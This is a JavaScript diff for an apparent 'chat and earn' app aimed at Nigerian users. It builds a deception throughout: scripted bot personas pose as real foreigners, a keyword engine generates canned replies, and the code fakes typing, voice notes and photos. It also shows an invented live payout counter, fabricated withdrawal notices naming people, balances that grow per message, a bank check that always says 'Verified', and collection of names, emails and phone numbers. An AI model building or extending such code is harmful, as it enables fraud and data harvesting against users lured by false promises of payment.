+      "Okay so I have to ask — jollof rice. Nigerian vs Ghanaian. Where do you stand? 😂 My colleague gets SO defensive about this topic lol",
+      "Hahaha I KNEW you'd say that 😂 She says the exact same thing with so much passion. I've had Nigerian jollof at a party before and it was genuinely amazing though.",
+      "Right?? There's something about the smoky taste. Okay what else should I know about Nigerian food? Give me your top 3 😄",
+      "Ohhh suya!! I've had that from a Nigerian restaurant in Peckham and it was 10/10 🔥 Do you eat it regularly there or is it more of a special occasion thing?",
+      "That's so cool. I love how food is such a big part of the culture. In London we don't really have that same community feeling around food anymore 😔",
+      "Honestly you've made me want to visit Nigeria now 😂 Lagos or Abuja — where would you recommend for a first-time visitor? Be honest!",
+    ]
+  },
+  {
+    name:"MattJohn", flag:"🇨🇦", initials:"MJ",
+    color:"linear-gradient(135deg,#1B5E20,#66BB6A)",
+    country:"Canada", rate:10000,
+    msgs:[
+      "Hey what's good! 🤙 I'm Matt from Toronto. Just joined this app, seems pretty cool. You from Nigeria?",
+      "Aye nice! Nigeria's been on my radar a lot lately honestly. Between the music and the tech stuff I keep seeing online, seems like things are popping over there 🔥",
+      "For real for real. Wizkid literally sold out the O2 Arena in London which is massive bro. Do people in Nigeria feel proud when they see that kind of thing happen?",
+      "That's dope man. Like a whole wave of Nigerian culture going global. It must feel good to be part of that. What city are you in?",
+      "Oh word! I have zero knowledge of Nigerian cities beyond Lagos and Abuja lol. What's it like living there day to day?",
+      "That's real talk. I feel like hustle is the vibe everywhere but Nigeria sounds like it's on a different level 😅 Do you guys sleep? 😂",
+      "Hahaha respect. In Toronto we complain about traffic and it doesn't even compare to what you're describing 😂. What do you do to unwind after a long day?",
+      "Aye that's the move. Simple but effective 😄 Over here in winter we just stay inside and watch Netflix for like 5 months straight. Canada winters hit different 🥶",
+      "Bro yes 😂 -20 degrees is not a joke. But summer here is fire tho, genuinely beautiful. Have you ever thought about travelling abroad?",
+      "Canada is a good choice honestly lol. If you ever come to Toronto I'll tell you the best spots 🙌 What's your biggest goal right now if you don't mind sharing?",
+    ]
+  },
+  {
+    name:"Abi1990", flag:"🇺🇸", initials:"AB",
+    color:"linear-gradient(135deg,#E65100,#FFA726)",
+    country:"United States", rate:15000,
+    msgs:[
+      "Hiii!! 😊 So happy to be matched with someone from Nigeria! I'm Abi from Atlanta Georgia. I literally love everything about Nigerian culture 🙌",
+      "Oh my gosh YES! I've been obsessed with Afrobeats since like 2019. Davido, Burna, Wizkid, Asake... I know all the lyrics and my friends think I'm crazy 😂 Are you into music?",
+      "That is so cool!! See I feel like Nigerians just have music in their blood. Like the rhythm, the energy... it's different. Do you dance too or just listen?",
+      "Hahaha okay you have to teach me some moves 😂 I've been trying to learn Zanku for months and I still look ridiculous. What's the easiest Naija dance to learn?",
+      "Okay I'm writing that down 😄 Also I have to ask — I tried making jollof rice from a YouTube tutorial last week and it came out... not great lol. What am I doing wrong?",
+      "OHHHH the smoky pot flavor!! That's what mine was missing 😭 My Nigerian friend told me the same thing. She said I need a real pot not a non-stick pan 😂",
+      "I'm taking notes honestly 📝 You're like my personal Nigeria guide lol. Can I ask — what's everyday life like for you? Like morning to night?",
+      "Wow that's so real. You make it work though and I respect that so much 💪 In Atlanta we have a big Nigerian community actually — have you heard of Little Nigeria in Atlanta?",
+      "It's this whole area with Nigerian restaurants, shops, events... it's amazing. The jollof there is INCREDIBLE. I think about it all the time 😩🔥",
+      "You should come visit one day honestly! Atlanta is so much fun and the Nigerian community here would make you feel right at home 🙌 What would be your dream trip abroad?",
+    ]
+  },
+  {
+    name:"princess77", flag:"🇩🇪", initials:"PR",
+    color:"linear-gradient(135deg,#4A148C,#CE93D8)",
+    country:"Germany", rate:8000,
+    msgs:[
+      "Hello! 😊 I am Sandra from Berlin. Nice to meet you. I have not spoken to many people from Nigeria before so I am curious.",
+      "Oh that is interesting! I did not know much about Nigeria until recently. My flatmate here in Berlin is from Lagos and she always tells me stories. Is Lagos really as busy as she says?",
+      "Haha yes she says the same thing! She says Berlin feels like a quiet village compared to Lagos 😄 I find that hard to imagine because Berlin is not small at all.",
+      "That is really fascinating. In Germany we also have traffic but people are very... orderly. There are rules for everything 😅 Is it difficult to live with so much chaos or do you get used to it?",
+      "I think I understand. My flatmate says Nigerian people are very resilient. She is one of the hardest working people I know honestly. Is that a common thing there?",
+      "I believe it. Here in Germany people work hard too but in a very structured way. We have work-life balance culture. Do you have time to relax in Nigeria or is it always go go go?",
+      "That sounds nice actually. Simple enjoyment. I think Germans overcomplicate relaxation sometimes 😄 We have to plan everything even our free time lol.",
+      "Haha yes exactly 😂 My flatmate laughs at me for this. She says Nigerians just go out and things happen naturally. I am trying to learn this approach honestly.",
+      "Can I ask — what is one thing about Nigeria that you wish more people in the world knew about? I feel like the news only shows bad things.",
+      "That is really beautiful to hear. I want to visit West Africa one day. Nigeria is on my list. What would you say is the most important thing to experience there? 😊",
+    ]
+  },
+  {
+    name:"CamilaAnders", flag:"🇦🇺", initials:"CA",
+    color:"linear-gradient(135deg,#006064,#4DD0E1)",
+    country:"Australia", rate:10000,
+    msgs:[
+      "G'day!! 😄 I'm Camila from Sydney. Just got matched with you — are you really in Nigeria? That's so far from me haha!",
+      "That's so wild to think about! Like we're literally on opposite ends of the earth chatting right now 😄 Which part of Nigeria are you in?",
+      "Oh amazing! I actually looked up Nigeria on the map once and I was surprised by how big it is. Like it's massive! Is there a big difference between the north and south?",
+      "Wow that's so interesting! It's almost like different countries within one country. Australia is similar in some ways — like Perth feels nothing like Sydney. Very different vibes.",
+      "Exactly! Sydney is beach culture, busy, expensive... Perth is more relaxed and spacious. What's the vibe where you are? More busy city or more chill?",
+      "Haha I love that! In Sydney we say the same thing — it never really stops 😂 Do you ever escape to somewhere more chill or are you a city person through and through?",
+      "That sounds amazing honestly 😍 I love road trips. Me and my friends drove down the Great Ocean Road last year — absolutely beautiful. Nigeria must have stunning scenery too right?",
+      "Oh wow yes!! I've seen pictures of the Niger Delta and some of the hills in the east and they look incredible. Do tourists actually visit those places or is it mainly locals?",
+      "I feel like Nigeria is so underrated as a travel destination honestly. The food, the culture, the music... Afrobeats literally dominates the charts here in Australia right now 🔥",
+      "It really is! My gym plays Burna Boy and Rema every single session 😂 Do you know those artists personally or are they just big names from your perspective too? 😄",
+    ]
+  },
+];
+
+/* LIVE PAYOUT COUNTER */
+(function(){
+  let base=12400000+Math.floor(Math.random()*800000);
+  const el=document.getElementById("liveCounter");
+  if(!el)return;
+  function fmt(n){return "₦"+n.toLocaleString("en-NG");}
+  el.textContent=fmt(base);
+  function tick(){
+    const a=[8000,10000,12000,15000,8000,15000,10000,12000];
+    base+=a[Math.floor(Math.random()*a.length)];
+    el.textContent=fmt(base);
+    setTimeout(tick,4000+Math.random()*4000);
+  }
+  setTimeout(tick,3000);
+})();
+
+/* ACTIVITY FEED */
+const ACT_PEOPLE=[
+  {i:"AO",c:"#FF6B35",n:"Adaeze",city:"Lagos"},{i:"EM",c:"#2979FF",n:"Emeka",city:"Abuja"},
+  {i:"FB",c:"#AA00FF",n:"Fatima",city:"Kano"},{i:"CJ",c:"#00C853",n:"Chukwudi",city:"Enugu"},
+  {i:"NG",c:"#FF1744",n:"Ngozi",city:"Port Harcourt"},{i:"TK",c:"#FFD600",n:"Tunde",city:"Ibadan"},
+  {i:"AB",c:"#00BCD4",n:"Amaka",city:"Benin"},{i:"SF",c:"#FF6B35",n:"Seun",city:"Lagos"},
+  {i:"IB",c:"#4CAF50",n:"Ibrahim",city:"Kaduna"},{i:"KO",c:"#E91E63",n:"Kemi",city:"Owerri"},
+];
+function showActivityToast(){
+  const p=ACT_PEOPLE[Math.floor(Math.random()*ACT_PEOPLE.length)];
+  const earnAmts=[8000,10000,12000,15000];
+  const withdrawAmts=[40000,42000,45000,48000,50000,55000,60000,65000];
+  // Action types: 0,2 = earned (use earnAmts) | 1,3 = withdrew (use withdrawAmts, min 40k)
+  const actionIdx=Math.floor(Math.random()*4);
+  let amt, action;
+  if(actionIdx===0){amt=earnAmts[Math.floor(Math.random()*earnAmts.length)];action=`just earned ₦${amt.toLocaleString("en-NG")} 💰`;}
+  else if(actionIdx===1){amt=withdrawAmts[Math.floor(Math.random()*withdrawAmts.length)];action=`just withdrew ₦${amt.toLocaleString("en-NG")} to OPay 🎉`;}
+  else if(actionIdx===2){amt=earnAmts[Math.floor(Math.random()*earnAmts.length)];action=`earned ₦${amt.toLocaleString("en-NG")} chatting 🔥`;}
+  else{amt=withdrawAmts[Math.floor(Math.random()*withdrawAmts.length)];action=`withdrew ₦${amt.toLocaleString("en-NG")} to PalmPay 💸`;}
+  const t=document.getElementById("activityToast");
+  document.getElementById("atAv").textContent=p.i;
+  document.getElementById("atAv").style.background=p.c;
+  document.getElementById("atName").textContent=p.n+" ("+p.city+")";
+  document.getElementById("atAction").textContent=action;
+  t.classList.add("show");
+  setTimeout(()=>t.classList.remove("show"),3500);
+}
+setTimeout(()=>{showActivityToast();setInterval(showActivityToast,12000+Math.random()*8000);},5000);
+
+function goScreen(id){
+  document.querySelectorAll(".screen").forEach(s=>{s.classList.remove("active");s.style.display="none";});
+  const target=document.getElementById(id);
+  target.classList.add("active");
+  if(["loading","processing"].includes(id)){target.style.display="flex";target.style.flexDirection="column";target.style.alignItems="center";target.style.justifyContent="center";}
+  else{target.style.display="block";}
+  currentScreen=id;window.scrollTo({top:0,behavior:"smooth"});
+}
+
+function doRegister(){
+  const name=document.getElementById("regName").value.trim();
+  const email=document.getElementById("regEmail").value.trim();
+  const phone=document.getElementById("regPhone") ? document.getElementById("regPhone").value.trim() : '';
+  const pass=document.getElementById("regPass").value.trim();
+  if(!name){showToast("⚠️ Enter your full name");return;}
+  if(!email||!email.includes("@")){showToast("⚠️ Enter a valid email");return;}
+  if(!pass||pass.length<6){showToast("⚠️ Password must be at least 6 characters");return;}
+  userName=name.split(" ")[0];
+  checkinStreak=1; lastCheckinDate=new Date().toDateString(); // Day 1 = signup day, counted but not modal-prompted
+  saveState();
+  // Save to Supabase — both tables for admin visibility
+  (async()=>{
+    try{
+      // Main users table
+      await supabaseClient.from('chatearn_users').insert([{
+        full_name: name, email: email, phone: phone,
+        balance: 10000, status: 'active',
+        registered_at: new Date().toISOString()
+      }]);
+      // Legacy registrations table (keep for compatibility)
+      await supabaseClient.from('chatearn_registrations').insert([{
+        full_name: name, user_email: email, phone: phone
+      }]);
+    }catch(e){ console.log('Registration save failed:', e); }
+  })();
+  goScreen("loading"); runLoadingSequence();
+}
+  
+function runLoadingSequence(){
+  const steps=["ls1","ls2","ls3","ls4"];
+  const fill=document.getElementById("ldFill");let i=0;
+  const iv=setInterval(()=>{
+    if(i<steps.length){
+      const s=document.getElementById(steps[i]);
+      s.classList.add("done");s.querySelector(".ld-step-dot").textContent="✓";
+      fill.style.width=((i+1)/steps.length*100)+"%";i++;
+    }else{
+      clearInterval(iv);
+      setTimeout(()=>{
+        goScreen("dashboard");
+        document.getElementById("dashName").textContent=userName+"!";
+        document.getElementById("dashBalance").textContent="₦"+totalBalance.toLocaleString("en-NG");
+        saveState();
+        // Auto-open a random foreigner chat after 1.5s
+        const pickIdx = Math.floor(Math.random()*FOREIGNERS.length);
+        setTimeout(()=>openChat(pickIdx),1500);
+      },600);
+    }
+  },700);
+}
+
+function openChat(idx){
+  currentChatUser=FOREIGNERS[idx];
+  document.getElementById("chatAv").innerHTML=`<div style="width:40px;height:40px;border-radius:50%;background:${currentChatUser.color};display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#000;position:relative;">${currentChatUser.initials}<div class="ch-online"></div></div>`;
+  document.getElementById("chatName").textContent=currentChatUser.name;
+  document.getElementById("chatStatus").textContent="🟢 Online now · "+currentChatUser.country;
+  document.getElementById("chatEarnBadge").textContent="+₦"+currentChatUser.rate.toLocaleString("en-NG")+"/reply";
+  document.getElementById("chatBody").innerHTML="";
+  chatHistory=[];chatBusy=false;goScreen("chat");
+  // Show typing status then send opening message
+  setTimeout(()=>{
+    document.getElementById("chatStatus").textContent="✍️ typing...";
+    deliverReply(currentChatUser.msgs[0]);
+  },1000);
+}
+
+function deliverReply(text, isSpecial){
+  const body=document.getElementById("chatBody");
+  // Typing indicator
+  const typing=document.createElement("div");
+  typing.className="typing-indicator";typing.id="typingIndicator";
+  typing.innerHTML='<div class="ti-dot"></div><div class="ti-dot"></div><div class="ti-dot"></div>';
+  body.appendChild(typing);body.scrollTop=body.scrollHeight;
+
+  // Delay based on message length (feels natural)
+  const delay = Math.min(800 + text.length * 18, 3200);
+
+  setTimeout(()=>{
+    const ti=document.getElementById("typingIndicator");if(ti)ti.remove();
+
+    // Occasionally drop a voice note or photo mid-conversation
+    const r=Math.random();
+    if(replyCount>1 && replyCount%5===0 && r<0.35){
+      addVoiceNote(body);
+      // Then deliver the text message after voice note
+      setTimeout(()=>{
+        const msg=document.createElement("div");msg.className="msg incoming";
+        msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()}</div>`;
+        body.appendChild(msg);body.scrollTop=body.scrollHeight;
+      },900);
+    } else if(replyCount>1 && replyCount%7===0 && r>=0.35&&r<0.6){
+      addPhotoBubble(body);
+      setTimeout(()=>{
+        const msg=document.createElement("div");msg.className="msg incoming";
+        msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()}</div>`;
+        body.appendChild(msg);body.scrollTop=body.scrollHeight;
+      },900);
+    } else {
+      const msg=document.createElement("div");msg.className="msg incoming";
+      msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()}</div>`;
+      body.appendChild(msg);body.scrollTop=body.scrollHeight;
+    }
+
+    // Occasionally go offline briefly then return
+    if(replyCount>0 && replyCount%4===0 && Math.random()<0.4){
+      document.getElementById("chatStatus").textContent="🔴 Last seen just now";
+      setTimeout(()=>{
+        document.getElementById("chatStatus").textContent="✍️ typing...";
+        setTimeout(()=>{
+          document.getElementById("chatStatus").textContent="🟢 Online now · "+currentChatUser.country;
+        },1500);
+      }, 3000+Math.random()*4000);
+    } else {
+      document.getElementById("chatStatus").textContent="🟢 Online now · "+currentChatUser.country;
+    }
+    chatBusy=false;
+    if(totalBalance>=MIN_WITHDRAW&&!withdrawPrompted){withdrawPrompted=true;setTimeout(()=>promptWithdraw(),1500);}
+    if(totalBalance>=MAX_EARN){setTimeout(()=>forceWithdraw(),2000);}
+  }, delay);
+}
+
+// ── SMART KEYWORD ENGINE ──
+const KEYWORD_REPLIES = {
+  // Locations
+  lagos:["Lagos!! That city is everywhere on my TikTok lately 😂 The energy looks insane, is it really like that?","Oh Lagos person! My friend visited last year and said it changed his life fr. Do you live on the island or mainland?","Lagos is literally the city everyone talks about. What's your favourite area to hang out?"],
+  abuja:["Abuja seems so different from Lagos from what I've seen online — more planned and quiet? Is that true?","Abuja looks so clean and organised compared to what I expected honestly 😄 Do you enjoy living there?","I've heard Abuja is more of a government city but also has a good nightlife scene? What's it really like?"],
+  ph:["Port Harcourt! The Garden City right? 😄 I've heard a lot about the oil money there lol","PH people are always so proud of their city 😂 What makes it special compared to Lagos?"],
+  "port harcourt":["Port Harcourt! The Garden City right? 😄 I've heard a lot about the oil money there lol","PH people are always so proud of their city 😂 What makes it special compared to Lagos?"],
+  kano:["Kano is in the north right? I heard it has a completely different vibe from the south — more traditional?","I find northern Nigeria so fascinating honestly. The architecture, the culture... it looks so rich. What's everyday life like there?"],
+  ibadan:["Ibadan! The city of brown roofs 😄 I actually read about it being one of the largest cities in West Africa. Is that true?"],
+  enugu:["Enugu the Coal City! I have a Nigerian friend whose family is from there and she says the people are the friendliest in Nigeria 😊"],
+  benin:["Benin City has such deep history — the Benin Kingdom, the bronzes... that's incredible heritage. Do people there still feel connected to that history?"],
+
+  // Food
+  jollof:["JOLLOF RICE 😭 Okay I have to say Nigerian jollof is different from anything I've ever tasted. What's the secret ingredient??","I had Nigerian jollof at a party last year and I've been obsessed since. Do you eat it every day or is it a special thing?","Haha the jollof wars are so funny from the outside 😂 But I have to be honest — Nigerian jollof hits different. What do you normally eat with it?"],
+  suya:["SUYA!! 🔥 I had suya from a Nigerian spot near me and it was literally the best meat I've ever eaten. What spice is that??","Suya is undefeated honestly. Do you eat it as a snack or more like a full meal?","The way Nigerians eat suya standing by the roadside at night looks so fun honestly 😄"],
+  egusi:["Egusi soup!! I've seen videos of people making it and it looks so rich and heavy. Is it an everyday meal or more special occasions?","My Nigerian colleague brought egusi to work once and the whole office was asking questions 😂 It smells so good"],
+  pounded:["Pounded yam!! The way Nigerians talk about it like it's a religion 😂 I've never had it but it looks like serious comfort food","I need to try pounded yam and egusi before I die honestly. Is it hard to make?"],
+  pepper:["Pepper soup!! 🔥 I've heard it cures everything from cold to heartbreak 😂 Is that actually true?"],
+  amala:["Amala and ewedu... I watched a video of someone eating it and the way they were enjoying it made me so hungry 😄"],
+
+  // Music
+  burna:["BURNA BOY 🔥🔥 He's literally on my playlist every single day. African Giant is a masterpiece. Have you ever seen him perform live?","Burna is huge here right now. My whole friend group is obsessed. Do Nigerians feel proud seeing him blow up globally?"],
+  wizkid:["Wizkid!! Essence is still one of my favourite songs ever made 😭 Do you listen to him a lot?","Wizkid selling out the O2 Arena was a whole moment. He's massive here. Are you a Wizkid fan?"],
+  davido:["Davido's energy is unmatched honestly. The way he connects with fans... do you follow him?","30BG!! 😂 Davido's journey has been incredible to watch from outside Nigeria honestly"],
+  asake:["Asake came out of nowhere and took over everything 😂 Work is so catchy I can't stop listening. Is he that big in Nigeria too?"],
+  rema:["Rema!! Calm Down was literally everywhere for months 😄 He seems so young to be that successful. Is he popular in Nigeria?"],
+  afrobeats:["Afrobeats is taking over the whole world honestly 🌍 I hear it everywhere now — clubs, gyms, radio. Does it feel special to be Nigerian right now?","The global rise of Afrobeats is incredible. What do you think made it blow up so fast internationally?"],
+
+  // Work / hustle
+  student:["Oh a student! What are you studying? 😊","Student life in Nigeria seems intense honestly — NEPA, no light, still grinding 😅 Respect","Students in Nigeria are so hardworking from what I see. What university are you in?"],
+  work:["What kind of work do you do? 😊","Nigerian hustle is on another level honestly. Everyone I talk to has like 3 things going on at once 😂"],
+  business:["Oh you have your own business? That's impressive! What kind? 😊","Nigerian entrepreneurs are everywhere honestly. The hustle is real. What industry are you in?"],
+  engineer:["Engineering in Nigeria is no joke! 💪 What type of engineering?","Nigerian engineers are highly respected globally. A lot of them are doing big things here abroad too"],
+  doctor:["Doctor! That's so impressive. How long is medical school in Nigeria?","Nigerian doctors are some of the best in the world honestly — so many here work in top hospitals"],
+  tech:["Nigerian tech scene is popping right now! Flutterwave, Paystack... the whole world is watching. Are you in tech?","The Lagos tech hub scene looks incredible. Are you involved in any of that?"],
+
+  // Weather / environment
+  hot:["Haha yes!! I've heard Nigeria is HOT 😂 Like serious heat. How do you cope especially without constant light?","The heat sounds intense honestly. Does it ever cool down or is it warm all year?"],
+  rain:["Rainy season in Nigeria looks so dramatic from the videos 😂 Heavy heavy rain. Is it nice or does it cause problems?"],
+  light:["NEPA situation 😭 I've heard so much about the light issue. How do you manage daily life with that?","The generator culture in Nigeria is so interesting to me honestly. Everyone just has a backup plan for everything 😄"],
+
+  // Travel / abroad
+  abroad:["Do you have plans to travel abroad one day? Where would you go first? 😊","Nigerians abroad are everywhere honestly — London, Houston, Toronto, everywhere. Do you have family abroad?"],
+  uk:["UK! London has a massive Nigerian community. Have you been or do you have family there?"],
+  usa:["USA is full of Nigerians 😄 Do you have any family or friends over here?","The Nigerian-American community is huge and so successful. Would you want to come to the US?"],
+  canada:["Canada is actually one of the top destinations for Nigerians now 😊 Have you thought about it?"],
+
+  // Greetings / general
+  fine:["That's good to hear! 😊 How's your day going so far?","Glad to hear that! What's keeping you busy today?"],
+  good:["Nice! 😊 How's everything going on your end today?","Good good! What's been the highlight of your day so far?"],
+  great:["Love to hear that! 🙌 What's making it a great day?"],
+  okay:["Just okay? 😄 What's going on? Tell me about your day","Okay is fine 😊 Anything interesting happening?"],
+  bored:["Haha I feel you 😂 That's why you're here right? Let's make it interesting — tell me something about yourself","Bored in Nigeria? Impossible 😂 What do you normally do for fun?"],
+  hello:["Hey!! 😊 So nice to chat with you! Where in Nigeria are you from?","Hii!! 😄 Tell me about yourself — where are you from?"],
+  hi:["Hey!! 😊 Great to meet you! Which part of Nigeria are you from?","Hii! 😄 So happy we got matched! Tell me about yourself"],
+  how:["I'm doing great thanks for asking! 😊 How about you — what's your day been like?","I'm good! Just enjoying chatting on here. How are things in Nigeria today?"],
+
+  // Family
+  family:["Family is everything in Nigeria from what I understand 😊 Are you from a big family?","Nigerian family culture seems so warm and close-knit. Do you live with family?"],
+  mother:["Aww Nigerian mums are the best honestly 😄 What's your mum like?"],
+  marry:["Marriage in Nigeria seems like a BIG deal 😂 All the traditional ceremonies, the outfits... it looks amazing","Haha Nigerian weddings are literally the most fun events I've ever seen on social media 😭🔥"],
+
+  // Default fallbacks by conversation stage
+  _early:["That's so interesting! 😊 Tell me more — I want to understand what life is really like for you","Haha I love that! You know what, talking to you is making me want to visit Nigeria fr 😄","Oh really? I didn't know that at all! What else should I know about Nigeria?","That makes sense actually 😊 Is that a common thing there or just your experience?"],
+  _mid:["Hahaha okay I see 😂 You're making Nigeria sound so amazing. Would you say most people there feel that way?","Honestly every time I chat with a Nigerian I learn something new 🙌 What's one thing most foreigners get wrong about Nigeria?","That's real talk 💯 I respect that. What would you say is the best and worst thing about living in Nigeria right now?","That's lowkey inspiring honestly 😊 Nigerians just don't stop. What keeps you motivated?"],
+  _late:["You know what, this has been one of my best conversations on here fr 😄 You're so real","I feel like I've learned more about Nigeria from you than from any YouTube video 😂 You should be a tour guide lol","Honestly I'm adding Nigeria to my travel list because of this chat 🙌 If I visit, what's the first thing you'd make me eat?","You're such good vibes honestly 😊 Do you chat on here often?"]
+};
+
+// Generic Nigerian states/cities not in main keyword list - get a generic location reply
+const NG_PLACES = ["ekiti","osun","ogun","ondo","oyo","edo","delta","anambra","imo","abia","akwa ibom","cross river","bayelsa","plateau","kaduna","sokoto","katsina","borno","yobe","jigawa","zamfara","kebbi","niger","kogi","kwara","nasarawa","taraba","adamawa","gombe","bauchi","ekitistate","ile-ife","ife","akure","abeokuta","owerri","umuahia","uyo","calabar","jos","ilorin","makurdi","minna","lokoja","yola","damaturu","gusau","birnin kebbi","dutse","lafia","jalingo","awka","asaba"];
+
+function getNextReply(userText){
+  const msgs = currentChatUser.msgs;
+  const text = (userText||"").toLowerCase();
+
+  // Always check specific keyword matches first (covers cities/topics user mentions)
+  const keywordGroups = Object.keys(KEYWORD_REPLIES).filter(k=>!k.startsWith('_'));
+  for(const kw of keywordGroups){
+    if(text.includes(kw)){
+      const options = KEYWORD_REPLIES[kw];
+      return options[Math.floor(Math.random()*options.length)];
+    }
+  }
+
+  // Check for other Nigerian places not specifically scripted - generic location reply
+  for(const place of NG_PLACES){
+    if(text.includes(place)){
+      const genericLocationReplies = [
+        "Oh nice! I haven't heard much about that area but I'd love to know more 😊 What's it like living there?",
+        "I'll be honest I don't know much about that part of Nigeria but it sounds interesting! What's it known for?",
+        "That's somewhere I've never heard of before but now I'm curious 😄 Tell me more about it!",
+        "Oh cool, I should look that up sometime! Is it a big city or more chill/quiet?"
+      ];
+      return genericLocationReplies[Math.floor(Math.random()*genericLocationReplies.length)];
+    }
+  }
+
+  // For the very first reply (replyCount==1), use scripted message #1 if no keyword matched
+  // since it's a natural intro flow (asking where they're from)
+  if(replyCount === 1){
+    return msgs[1];
+  }
+
+  // After that, use stage-based smart fallback
+  if(replyCount<=3) return KEYWORD_REPLIES._early[Math.floor(Math.random()*KEYWORD_REPLIES._early.length)];
+  if(replyCount<=6) return KEYWORD_REPLIES._mid[Math.floor(Math.random()*KEYWORD_REPLIES._mid.length)];
+  return KEYWORD_REPLIES._late[Math.floor(Math.random()*KEYWORD_REPLIES._late.length)];
+}
+
+function addVoiceNote(body){
+  const durs=["0:12","0:07","0:19","0:08","0:14"];
+  const dur=durs[Math.floor(Math.random()*durs.length)];
+  const bars=Array.from({length:18},()=>{const h=4+Math.floor(Math.random()*16);return `<div class="vb-bar" style="height:${h}px;background:var(--green);opacity:0.7;"></div>`;}).join("");
+  const wrap=document.createElement("div");wrap.className="msg incoming";
+  wrap.innerHTML=`<div class="voice-bubble"><div class="vb-play">▶</div><div class="vb-wave">${bars}</div><div class="vb-dur">${dur}</div></div><div class="msg-time">${getTime()}</div>`;
+  body.appendChild(wrap);body.scrollTop=body.scrollHeight;
+}
+
+function addPhotoBubble(body){
+  const photos=["🏖️","🌆","🍕","🎉","😄","🌸","🏠","🎵","🌤️","🦋"];
+  const icon=photos[Math.floor(Math.random()*photos.length)];
+  const caps=["That's my neighborhood!","This is where I am rn 😊","Look at this lol","Random pic 😄","My view today 🌤️"];
+  const cap=caps[Math.floor(Math.random()*caps.length)];
+  const wrap=document.createElement("div");wrap.className="msg incoming";
+  wrap.innerHTML=`<div class="photo-bubble"><div class="photo-bubble-inner">${icon}</div><div class="photo-bubble-cap">${cap}</div></div><div class="msg-time">${getTime()}</div>`;
+  body.appendChild(wrap);body.scrollTop=body.scrollHeight;
+}
+
+function handleEnter(e){if(e.key==="Enter")sendMsg();}
+
+function sendMsg(){
+  if(chatBusy)return;
+  if(totalBalance>=MAX_EARN){showToast("⚠️ Maximum earnings reached! Please withdraw first.");forceWithdraw();return;}
+  const input=document.getElementById("chatInput");
+  const text=input.value.trim();if(!text)return;
+  chatBusy=true;input.value="";
+  const body=document.getElementById("chatBody");
+  const earned=currentChatUser.rate;
+  replyCount++;totalBalance+=earned;chatEarnings+=earned;saveState();
+  const msg=document.createElement("div");msg.className="msg outgoing";
+  msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()} <span style="color:#00E676;font-size:12px;">✓✓</span></div><div class="msg-earn">+₦${earned.toLocaleString("en-NG")} earned! 💰</div>`;
+  body.appendChild(msg);body.scrollTop=body.scrollHeight;
+  showEarnToast("+₦"+earned.toLocaleString("en-NG")+" Earned! 💰");
+  updateBalance();
+  // Show "typing..." in chat status
+  document.getElementById("chatStatus").textContent="✍️ typing...";
+  // Get smart context-aware reply
+  const nextReply = getNextReply(text);
+  deliverReply(nextReply);
+}
+
+function updateBalance(){
+  const fmt=n=>"₦"+n.toLocaleString("en-NG");
+  document.getElementById("dashBalance").textContent=fmt(totalBalance);
+  document.getElementById("earnPageAmount").textContent=totalBalance.toLocaleString("en-NG");
+  document.getElementById("chatEarnBreakdown").textContent=fmt(chatEarnings);
+  document.getElementById("totalEarnBreakdown").textContent=fmt(totalBalance);
+  document.getElementById("wdAmount").textContent=fmt(totalBalance);
+  if(totalBalance>=MIN_WITHDRAW){
+    document.getElementById("wdTeaserBtn").textContent="Withdraw 💰";
+    document.getElementById("wdTeaserBtn").classList.add("active");
+    document.getElementById("wdTeaserSub").textContent=fmt(totalBalance)+" ready to withdraw!";
+  }
+}
+
+function promptWithdraw(){
+  if(document.getElementById("wdPromptNotice"))return;
+  const body=document.getElementById("chatBody");
+  const notice=document.createElement("div");notice.id="wdPromptNotice";
+  notice.style.cssText="background:rgba(0,200,83,.12);border:1px solid rgba(0,200,83,.3);border-radius:12px;padding:14px;margin:10px 0;text-align:center;";
+  notice.innerHTML=`<div style="font-size:24px;margin-bottom:6px;">🎉</div><div style="font-size:15px;font-weight:800;color:#00E676;margin-bottom:4px;">₦${totalBalance.toLocaleString("en-NG")} Earned!</div><div style="font-size:12px;color:#B0B0B0;margin-bottom:10px;">Withdrawal available! Withdraw now.</div><button onclick="goScreen('earnings')" style="background:#00C853;color:#000;border:none;border-radius:10px;padding:10px 20px;font-size:14px;font-weight:800;cursor:pointer;">Withdraw Now →</button>`;
+  body.appendChild(notice);body.scrollTop=body.scrollHeight;
+}
+
+function forceWithdraw(){
+  if(document.getElementById("forceWdNotice"))return;
+  const body=document.getElementById("chatBody");
+  const notice=document.createElement("div");notice.id="forceWdNotice";
+  notice.style.cssText="background:rgba(255,215,0,.12);border:2px solid rgba(255,215,0,.4);border-radius:12px;padding:16px;margin:10px 0;text-align:center;";
+  notice.innerHTML=`<div style="font-size:24px;margin-bottom:6px;">⚠️</div><div style="font-size:15px;font-weight:800;color:#FFD600;margin-bottom:6px;">Maximum Earnings Reached!</div><div style="font-size:12px;color:#B0B0B0;margin-bottom:12px;">Withdraw your ₦${totalBalance.toLocaleString("en-NG")} before you can continue chatting.</div><button onclick="goScreen('earnings')" style="background:#FFD600;color:#000;border:none;border-radius:10px;padding:12px 24px;font-size:15px;font-weight:800;cursor:pointer;">Withdraw ₦${totalBalance.toLocaleString("en-NG")} Now →</button>`;
+  body.appendChild(notice);body.scrollTop=body.scrollHeight;
+}
+
+function tryWithdraw(){
+  if(totalBalance>=MIN_WITHDRAW)goScreen("earnings");
+  else showToast("⚠️ Keep chatting! Minimum withdrawal is ₦40,000");
+}
+
+let bankVerifyTimer=null;
+function triggerBankVerify(val){
+  const statusEl=document.getElementById("bankVerifyStatus");
+  clearTimeout(bankVerifyTimer);
+  if(val.length<10){
+    statusEl.style.display="none";
+    return;
+  }
+  // Show verifying spinner
+  statusEl.style.display="block";
+  statusEl.style.background="rgba(255,193,7,.1)";
+  statusEl.style.border="1px solid rgba(255,193,7,.3)";
+  statusEl.style.color="#FFD600";
+  statusEl.innerHTML='<span style="animation:spin 1s linear infinite;display:inline-block;">⏳</span> Verifying account...';
+  bankVerifyTimer=setTimeout(()=>{
+    const bankName=selectedBank==="opay"?"OPay":"PalmPay";
+    statusEl.style.background="rgba(0,200,83,.1)";
+    statusEl.style.border="1px solid rgba(0,200,83,.3)";
+    statusEl.style.color="#00E676";
+    statusEl.innerHTML='✅ Account Verified — '+bankName;
+  },1800);
+}
+
+function selectBank(bank){
+  selectedBank=bank;
